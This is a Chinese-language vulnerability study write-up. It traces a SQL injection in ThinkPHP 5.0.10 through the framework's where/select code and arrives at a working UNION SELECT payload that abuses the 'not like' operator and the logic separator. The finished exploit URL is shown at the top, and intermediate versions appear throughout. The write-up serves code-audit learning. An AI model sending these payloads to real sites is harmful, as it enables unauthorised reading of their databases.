# ThinkPHP 之 SQLI审计分析(二)

**Time：9-3**

**影响版本：ThinkPHP=5.0.10**

**Payload：**

```
/public/index.php/index/index?username[0]=not like&username[1][0]=&username[1][1]=&username[2]=) union select 1,user()--+
```

这是一篇由已知漏洞寻找利用过程的文章，跟着**[参考链接](https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part2/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A54.md)**学习分析，这次重点关注**可控参数的处理、传递**，所以废话较多。以下是收获记录。

---

### 0x00 测试代码做了什么？

```php
<?php
namespace app\index\controller;

class Index
{
    public function index()
    {
        $username = request()->get('username/a');
        $result = db('users')->where(['username' => $username])->select();
        var_dump($result);
    }
}

//分析时用的paylaod：/public/index.php/index/index?username[0]=1&username[1]=2
```

与上次不同，这次是先调用`where`方法处理`$username`再调用`select`方法进行查询，即程序构造的SQL语句应该是`select * from users where 可控数据`。

### 0x01 分析调用

①按照调用顺序先来分析一下`where`方法：

**thinkphp/library/think/db/Query.php**

![image-20210903113540859](ThinkPHP5之SQLI审计分析(二)_images/image-20210903113540859.png)

**937行**的函数返回一个包含函数参数列表的数组，938行的函数将数组开头的单元移出数组，这里调用where的时候没有指定`$op`和`$condition`，且这两个参数默认为`null`，所以这两行处理完之后`$param`就是个空数组了。

**939行**调用了`parseWhereExp`方法且没有返回值，是直接通过`$this`指针调用本类方法，且这段函数最后也是返回了`$this`指针，所以要着重分析`parseWhereExp`方法，其中`$field`参数是可控的`['username'=>$username]`

跟进`parseWhereExp`方法，注意到其中**1168行**是即将要进入的分支代码。

![image-20210903114952850](ThinkPHP5之SQLI审计分析(二)_images/image-20210903114952850.png)

着重看一下该分支的代码：

![image-20210903115128259](ThinkPHP5之SQLI审计分析(二)_images/image-20210903115128259.png)

将`$field`赋值到`$where`，下面有段判断$where是否为空的分支待会儿看，这里就是简单的给`$this->options`赋一些值。下面的一些elseif都不会进去就不用看了，来到**1200行**的if：

![image-20210903115825074](ThinkPHP5之SQLI审计分析(二)_images/image-20210903115825074.png)

依然是简单的给`$this->options`加元素、赋值，这里之后where就结束了，且$this->options中有我们可控的值，主要关注`$this->options['where']['AND']`的值，就是最开始的 `$username`。

②接下来再分析一下`select`方法：

因为`where`方法返回的是`$this`，再调用的`select`方法也是`Query`这个类的，来到**2277行**，这里将部分代码折叠起来了，因为只需要看看判断条件就知道会执行哪段代码。

![image-20210903131833019](ThinkPHP5之SQLI审计分析(二)_images/image-20210903131833019.png)

看到**2306行**，注释是生成SQL语句，且和上次审计一样都是调用的builder的方法，有了经验这里就自然而然知道代码在**Builder.php**，不过这次重点关注传参，`$options` 源于**2286行**，那么先去看看`parseExpress`这个函数。

![image-20210903133236037](ThinkPHP5之SQLI审计分析(二)_images/image-20210903133236037.png)

![image-20210903133313165](ThinkPHP5之SQLI审计分析(二)_images/image-20210903133313165.png)

先看返回值能知道这个函数是对`$options`做了一些处理，而`$options`源于**2701行**的`$this->options`，再看**2708行**的`if`块，也不会进入。纵观整个函数的作用差不多就是把一些数据库的操作关键字加入到`$options`数组中，应该之后有可能用。此时，返回的$options中`$options['where']['AND']`的值依然没有变化。返回继续看`select`方法（往上数第三个图），进入**2306行**`$this->builder->select($options)`

**thinkphp/library/think/db/Builder.php**

![image-20210903134340825](ThinkPHP5之SQLI审计分析(二)_images/image-20210903134340825.png)

因为关注的变量一直是`$options['where']`，遂跟进`parseWhere`：

![image-20210903134505340](ThinkPHP5之SQLI审计分析(二)_images/image-20210903134505340.png)

**225行**`if`的条件同样不满足(在它上一行下个断点看一下当时`$options`的值就知道了)，执行**224行**完就会`return WHERE $whereStr`。时刻关注参数，此时的`$where`就是`$options['where']`，即我们可控。进入`buileWhere`

来到**243行**，大致扫一下该函数能看到多处拼接，说明越来越接近漏洞点。

![image-20210903135959441](ThinkPHP5之SQLI审计分析(二)_images/image-20210903135959441.png)

![image-20210903140025979](ThinkPHP5之SQLI审计分析(二)_images/image-20210903140025979.png)

![image-20210903140044461](ThinkPHP5之SQLI审计分析(二)_images/image-20210903140044461.png)

从**253行**初始化`$whereStr`开始看起，**255行**拆分`$where`，其中`$key`应该是`AND`，而`$val`则是`$username`，然后**257行**再次将`$val`拆分成`$field`和`$value`，`$field`应该是`['username' => $username]`中的`'username'`也就是`users`表的字段名，`$value`则就是`$username`即测试代码中`$username = request()->get('username/a');`的这个，即可控值，所以接下来重点关注`$value`的处理。

**258和266行**的判断暂时均不满足，就先直接看282的最后一个else分支，其调用了`parseWhereItem`，并传入了我们关心的`$value`，赋值给`$str[]`，且`$str`在**289行**会拼接到`$whereStr`之后直接`return`，跟进它一探究竟。

### 0x02 漏洞点的发现、构造、利用

依然是**thinkphp/library/think/db/Builder.php**

![image-20210903143033368](ThinkPHP5之SQLI审计分析(二)_images/image-20210903143033368.png)

**305行**用`list()`将`$val`分割，list()的作用是把数组中的值赋给一组变量，那么按照第一步中的测试payload

```
/public/index.php/index/index?username[0]=1&username[1]=2
```

$exp的值为1，$value的值为2，先暂且往下看，**308行**的`if`肯定不会进去了，来到**324行**

![image-20210903143503063](ThinkPHP5之SQLI审计分析(二)_images/image-20210903143503063.png)

这里需要知道一下$this->exp的值，在该文件的25行有定义

```php
protected $exp = ['eq' => '=', 'neq' => '<>', 'gt' => '>', 'egt' => '>=', 'lt' => '<', 'elt' => '<=', 'notlike' => 'NOT LIKE', 'not like' => 'NOT LIKE', 'like' => 'LIKE', 'in' => 'IN', 'exp' => 'EXP', 'notin' => 'NOT IN', 'not in' => 'NOT IN', 'between' => 'BETWEEN', 'not between' => 'NOT BETWEEN', 'notbetween' => 'NOT BETWEEN', 'exists' => 'EXISTS', 'notexists' => 'NOT EXISTS', 'not exists' => 'NOT EXISTS', 'null' => 'NULL', 'notnull' => 'NOT NULL', 'not null' => 'NOT NULL', '> time' => '> TIME', '< time' => '< TIME', '>= time' => '>= TIME', '<= time' => '<= TIME', 'between time' => 'BETWEEN TIME', 'not between time' => 'NOT BETWEEN TIME', 'notbetween time' => 'NOT BETWEEN TIME'];
```

这样的话应该是程序允许SQL语句中可存在的逻辑关键字，类似于白名单这种。根据`if`块的逻辑，这里我们应该让$exp的值是在白名单中存在的，不然就直接抛出错误了。<u>可以暂时更改一下测试paylaod，构造`username[0]=白名单中的键名`绕过这段代码。</u>

```
/public/index.php/index/index?username[0]=eq&username[1]=2
```

再往下看：

![image-20210903144712658](ThinkPHP5之SQLI审计分析(二)_images/image-20210903144712658.png)

这里is_scalar()函数不知道什么意思，查手册得知

![image-20210903145237042](ThinkPHP5之SQLI审计分析(二)_images/image-20210903145237042.png)

说明此时的payload是会进入这个分支进行处理的，下断点看看最后会处理成什么样子：

![image-20210903145211623](ThinkPHP5之SQLI审计分析(二)_images/image-20210903145211623.png)

可以看到，`$value`的值已经没有payload中的'2'了，意味着可控的值会被这段代码覆盖替换掉。为了保留可控值，这段代码也不能进入，所以`$value`不能是`int`、`float`、`string`、`bool`等类型，而只能是`array`、`object`、`resource`等类型，所以再次修改payload，让`$value`成为一个数组型变量：

```
/public/index.php/index/index?username[0]=eq&username[1][0]=2
```

再次下断点执行可以看到已经绕过了这段代码的处理，直接来到**349行**，（注意**357行**）。

![image-20210903145806214](ThinkPHP5之SQLI审计分析(二)_images/image-20210903145806214.png)

因为之前的`$exp`传入的是eq也就是“=”,所以会进入350的if，依然是在它处理后的位置下断点看看会把可控值处理成什么样子，这里直接在**350行**处下断点。

![image-20210903150451614](ThinkPHP5之SQLI审计分析(二)_images/image-20210903150451614.png)

可以看到要经过`parseValue`的处理后才会给`$whereStr`赋值，步进，return处下断点：

![image-20210903150842672](ThinkPHP5之SQLI审计分析(二)_images/image-20210903150842672.png)

这里看到值还是存在的，但是再一次步进就会跳到错误处理程序，大佬的文章并没有分析这里的流程，不过我猜估计是数组的问题导致拼接时候的错误。总之这段代码也是不能进去的，再次修改paylaod：

```
/public/index.php/index/index?username[0]=not like&username[1][0]=2
```

（修改为not like是因为之后的**357行**有这个判断）

![image-20210903151507411](ThinkPHP5之SQLI审计分析(二)_images/image-20210903151507411.png)

这段代码与刚刚的第一个`if`不同的是会把`$value`foreach一下再带入`parseValue`，这样就不会有数组变量直接拼接的错误了，同事，注意到**363行**会用到$val[2]，根据之前的分析$val就是传入的$username，所以这里payload还得加一个参数$username[2]

```
/public/index.php/index/index?username[0]=not like&username[1][0]=2&username[2]=1
```

然后得到`$whereStr`，下断点看看这里`$whereStr`变成什么样儿了：

![image-20210903152124708](ThinkPHP5之SQLI审计分析(二)_images/image-20210903152124708.png)

可以看到'2'已经完美拼接进去。尝试闭合括号，注释掉后面多余的字符，构造payload：

```
/public/index.php/index/index?username[0]=not like&username[1][0]=) union select 1,user()--+&username[2]=1
```

![image-20210903152432713](ThinkPHP5之SQLI审计分析(二)_images/image-20210903152432713.png)

可以看到没有过滤的直接拼接自定义SQL语句，但是放行后页面回显的却是empty，意思是查询没结果。先完整走一遍代码看看最后生成的SQL是什么样子。在**thinkphp/library/think/db/Query.php**的**2308行**下断点：

![image-20210903152927749](ThinkPHP5之SQLI审计分析(二)_images/image-20210903152927749.png)

可以看到这里的单引号没有闭合导致user()没有当作函数执行，尝试加单引号闭合果不其然被转义了：
![image-20210903153407566](ThinkPHP5之SQLI审计分析(二)_images/image-20210903153407566.png)

这样的话就得找到一种能够利用程序本身闭合单引号的办法，好好分析：

![image-20210903154348330](ThinkPHP5之SQLI审计分析(二)_images/image-20210903154348330.png)

**361行**的

```
$array[] = $key . ' ' . $exp . ' ' . $this->parseValue($item, $field);
```

可以写成

```
$array[] = 'username not like ' . $this->parseValue($item, $field);
```

且$value有几个元素就生成几个这样的字符串。

突然发现**363行**的$logic=1刚才并没有被拼接到字符串中

![image-20210903154703645](ThinkPHP5之SQLI审计分析(二)_images/image-20210903154703645.png)

这就比较奇怪了，好好看一看implode的用法：

![image-20210903155237704](ThinkPHP5之SQLI审计分析(二)_images/image-20210903155237704.png)

看phpstorm的提示好像要求`' ' . strtoupper($logic) . ' '`这是个array？？？

不过既然第一个参数可以为数组，那就先给$array再加一个元素，也就是再加一个`$username[1][1]`:

```
/public/index.php/index/index?username[0]=not like&username[1][0]=) union select 1,user()--+&username[1][1]=1&username[2]=2
```

![image-20210903155931301](ThinkPHP5之SQLI审计分析(二)_images/image-20210903155931301.png)

可以看到，`'2'`也就是username[2]分割了array[0]和array[1]，且array的元素都是会被单引号包裹起来的，所以攻击函数就不能放在array里，那么可以尝试一下，用`union select 1,user()--+`作为分割符 `$logic`，也就是将`username[2]=union select 1,user()--+`:

```
/public/index.php/index/index?username[0]=not like&username[1][0]=1&username[1][1]=2&username[2]=union select 1,user()--+
```

![image-20210903160448953](ThinkPHP5之SQLI审计分析(二)_images/image-20210903160448953.png)

可以看到`union select 1,user()--+`没有被单引号包裹，再闭合一下括号就完美了：

```
/public/index.php/index/index?username[0]=not like&username[1][0]=1&username[1][1]=2&username[2]=) union select 1,user()--+
```

![image-20210903160607039](ThinkPHP5之SQLI审计分析(二)_images/image-20210903160607039.png)

即`(username NOT LIKE '1' ) UNION SELECT 1,USER()--  username NOT LIKE '2')`

即`(username NOT LIKE '1' ) UNION SELECT 1,USER()`

再看一下最后生成的SQL语句：
![image-20210903160755712](ThinkPHP5之SQLI审计分析(二)_images/image-20210903160755712.png)

`SELECT * FROM users WHERE  (username NOT LIKE '1' ) UNION SELECT 1,USER()--  username NOT LIKE '2') `

完美了，结束。

![image-20210903160922959](ThinkPHP5之SQLI审计分析(二)_images/image-20210903160922959.png)

### 0x03 总结

总感觉这个过程还有好多地方疏忽掉了，依然只是由答案推过程的行为。

因为欠缺的经验还是太多，所以文中可能废话也比较多，只是为了让自己更加理清逻辑。

关于not like可用是因为这个版本的tp在过滤的时候漏掉了带空格的`not like`这个在文中没有详细分析，比较不完美。

感谢七月火大佬的干货文章。